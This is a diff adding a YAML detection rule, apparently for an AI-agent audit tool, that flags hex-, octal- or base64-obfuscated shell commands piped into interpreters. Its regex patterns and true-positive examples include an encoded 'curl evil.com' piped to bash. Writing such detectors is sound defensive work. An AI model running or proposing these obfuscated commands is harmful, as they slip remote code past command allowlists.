@@ -1,0 +1,57 @@
+# =============================================================
+# aguara.command-execution.hex-or-octal-escape-obfuscation
+# =============================================================
+# Adapted from CMDEXEC_014 (https://github.com/garagon/aguara)
+# Apache-2.0 (c) 2026 garagon
+# Source: Aguara
+# Severity: high  |  ASAMM: AD-02 (+AG-02,AD-04)
+# =============================================================
+external_source:
+  tool: aguara
+  original_id: CMDEXEC_014
+  original_title: Hex or octal escape obfuscation
+  source_version: git-d8797926c0d1
+  import_date: '2026-05-03'
+  upstream: https://github.com/garagon/aguara
+  license: Apache-2.0 (c) 2026 garagon
+agent_audit_id: aguara.command-execution.hex-or-octal-escape-obfuscation
+title: Hex or octal escape obfuscation
+description: Detects shell commands using hex or octal escape sequences to obfuscate payloads and bypass command allowlists
+severity_default: high
+category: command-execution
+audit_surface:
+- instruction_file
+- skill_md
+- tool_description
+asamm:
+  primary: AD-02
+  secondary:
+  - AG-02
+  - AD-04
+  mapping_confidence: category-default
+  notes: Category-level default at import. Review per rule.
+match_mode: any
+patterns:
+- type: regex
+  value: (?i)(printf|echo)\s+["'][^"']*\\x[0-9a-fA-F]{2}[^"']*["']\s*\|\s*(sh|bash|zsh|python|perl)\b
+- type: regex
+  value: (?i)\$['"]\\x[0-9a-fA-F]{2}
+- type: regex
+  value: (?i)(printf|echo)\s+["'][^"']*\\[0-7]{3}[^"']*["']\s*\|\s*(sh|bash)\b
+- type: regex
+  value: (?i)(base64\s+-d|base64\s+--decode)\s*\|\s*(sh|bash|python|perl|ruby|node)\b
+- type: regex
+  value: (?i)(xxd\s+-r|od\s+-An)[^|]*\|\s*(sh|bash)\b
+exclude_patterns: []
+remediation: Block piping decoded content to shell interpreters. Validate decoded payloads before execution and reject obfuscated
+  inputs.
+examples:
+  true_positive:
+  - echo 'Y3VybCBldmlsLmNvbQ==' | base64 -d | bash
+  - printf '\x63\x75\x72\x6c' | sh
+  - $'\x63\x75\x72\x6c\x20\x68\x74\x74\x70'
+  - xxd -r <<< '63 75 72 6c' | bash
+  false_positive:
+  - echo 'hello' | base64
+  - base64 -d < input.txt > output.bin
+  - xxd binary.dat
